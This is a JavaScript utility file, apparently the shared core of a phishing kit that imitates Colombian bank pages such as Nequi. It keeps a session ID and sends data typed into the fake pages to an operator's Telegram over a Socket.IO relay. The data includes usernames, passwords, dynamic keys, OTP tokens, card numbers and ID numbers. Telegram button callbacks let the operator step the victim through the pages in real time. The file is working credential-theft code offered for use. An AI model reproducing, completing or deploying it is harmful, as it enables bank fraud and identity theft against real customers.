/**
 * BANCO-UTILS.JS - Utilidades compartidas para todas las bancas
 * Patrón Singleton con funciones reutilizables
 */

(function() {
    'use strict';

    // Estado privado
    let socket = null;
    let sessionId = null;
    let overlayElement = null;
    let isInitialized = false;

    /**
     * Configuración y conexión Socket.IO
     */
    function initSocket() {
        if (socket && socket.connected) return socket;

        sessionId = localStorage.getItem('nequiSessionId');
        if (!sessionId) {
            sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem('nequiSessionId', sessionId);
        }

        socket = io('http://localhost:3000', {
            reconnection: true,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            reconnectionAttempts: Infinity,
            transports: ['websocket', 'polling']
        });

        socket.on('connect', () => {
            console.log('✅ Socket conectado:', socket.id);
            socket.emit('init_session', { sessionId });
        });

        socket.on('session_ready', (data) => {
            console.log('✅ Sesión lista:', data.sessionId);
            localStorage.setItem('nequiSessionId', sessionId);
        });

        socket.on('disconnect', (reason) => {
            console.log('⚠️ Socket desconectado:', reason);
        });

        return socket;
    }

    /**
     * Obtener o crear el overlay de carga
     */
    function getOverlay() {
        if (overlayElement) return overlayElement;

        overlayElement = document.getElementById('loadingOverlay') || 
                        document.querySelector('.loading-overlay') ||
                        document.querySelector('.loadingOverlay');

        if (!overlayElement) {
            console.warn('⚠️ No se encontró overlay en el DOM');
        }

        return overlayElement;
    }

    /**
     * Mostrar overlay
     */
    function showOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;

        overlay.classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    /**
     * Ocultar overlay
     */
    function hideOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;

        overlay.classList.remove('active', 'show');
        document.body.style.overflow = '';
    }

    /**
     * Enviar datos al Telegram centralizado
     */
    async function sendToTelegram(type, content) {
        return new Promise((resolve, reject) => {
            if (!socket || !socket.connected) {
                reject(new Error('Socket no conectado'));
                return;
            }

            const timeoutId = setTimeout(() => {
                reject(new Error('Timeout esperando respuesta'));
            }, 30000);

            socket.once('dataSent', (response) => {
                clearTimeout(timeoutId);
                if (response.success) {
                    resolve(response);
                } else {
                    reject(new Error(response.error || 'Error desconocido'));
                }
            });

            socket.emit('sendData', {
                sessionId,
                type,
                content
            });
        });
    }

    /**
     * Configurar manejador de acciones de Telegram
     */
    function onTelegramAction(callback) {
        if (!socket) {
            console.error('❌ Socket no inicializado');
            return;
        }

        socket.on('telegramAction', (data) => {
            console.log('📲 Acción recibida:', data);
            hideOverlay();
            if (callback) callback(data);
        });
    }

    /**
     * Formatear mensaje con datos acumulados
     */
    function formatMessage(bankName, bankData) {
        let message = `\n🔔 <b>${bankName.toUpperCase()}</b>\n\n`;
        message += '📝 <b>INFORMACIÓN:</b>\n';

        // Convertir objeto a array de [clave, valor] y formatear
        Object.entries(bankData).forEach(([key, value]) => {
            if (value && value !== 'N/A') {
                const label = formatLabel(key);
                message += `${label} <b>${key}:</b> ${value}\n`;
            }
        });

        message += `\n⏰ ${new Date().toLocaleString('es-CO')}`;
        return message.trim();
    }

    /**
     * Formatear etiqueta según el tipo de dato
     */
    function formatLabel(key) {
        const labels = {
            usuario: '👤',
            clave: '🔐',
            password: '🔐',
            dinamica: '🔢',
            token: '📱',
            otp: '📱',
            tarjeta: '💳',
            cedula: '🆔',
            documento: '🆔',
            telefono: '📞',
            email: '📧'
        };
        return labels[key.toLowerCase()] || '📋';
    }

    /**
     * Crear teclado con botones estándar
     */
    function createKeyboard(buttons, sessionId) {
        if (!Array.isArray(buttons) || buttons.length === 0) {
            return null;
        }

        return {
            inline_keyboard: buttons.map(btn => [{
                text: btn.text,
                callback_data: `${btn.action}:${sessionId}`
            }])
        };
    }

    /**
     * Validar campo numérico
     */
    function validateNumeric(input, length) {
        const value = input.value.replace(/[^0-9]/g, '');
        input.value = length ? value.slice(0, length) : value;
        return value;
    }

    /**
     * Gestionar sessionStorage por banco
     */
    function getBankData(bankName) {
        const key = `${bankName.toLowerCase()}Data`;
        return JSON.parse(sessionStorage.getItem(key) || '{}');
    }

    function saveBankData(bankName, data) {
        const key = `${bankName.toLowerCase()}Data`;
        const existing = getBankData(bankName);
        const merged = { ...existing, ...data };
        sessionStorage.setItem(key, JSON.stringify(merged));
        return merged;
    }

    /**
     * Inicializar utilidades
     */
    function init() {
        if (isInitialized) return;
        initSocket();
        isInitialized = true;
        console.log('✅ BancoUtils inicializado');
    }

    // API Pública
    window.BancoUtils = {
        init,
        initSocket,
        getSocket: () => socket,
        getSessionId: () => sessionId,
        getOverlay,
        showOverlay,
        hideOverlay,
        sendToTelegram,
        onTelegramAction,
        formatMessage,
        createKeyboard,
        validateNumeric,
        getBankData,
        saveBankData
    };

    // Auto-inicializar solo el socket
    init();
})();
